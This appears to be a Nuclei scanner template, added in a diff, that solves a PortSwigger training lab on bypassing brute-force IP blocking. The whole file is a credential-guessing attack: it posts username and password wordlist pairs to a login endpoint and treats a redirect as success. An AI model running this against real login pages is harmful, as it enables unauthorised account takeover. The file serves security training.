@@ -1,0 +1,29 @@
+id: 4_lab_auth_portswigger_username_password
+
+info:
+  name: Broken brute-force protection, IP block
+  author: XI
+  severity: high
+  description: Broken brute-force protection, IP block
+  reference: https://XI
+  tags: portswigger, learn, nuclei, auth
+
+http: 
+  - raw:
+    - |
+      POST /login HTTP/2
+      Host: {{Host}}
+      Content-Type: application/x-www-form-urlencoded
+
+      username={{username}}&password={{password}}
+
+    payloads:
+      username: ./usernames_with_wiener.txt
+      password: ./passwords_with_peter.txt
+
+    cookie-reuse: true
+    stop-at-first-match: true
+    matchers:
+      - type: status
+        status:
+          - 302
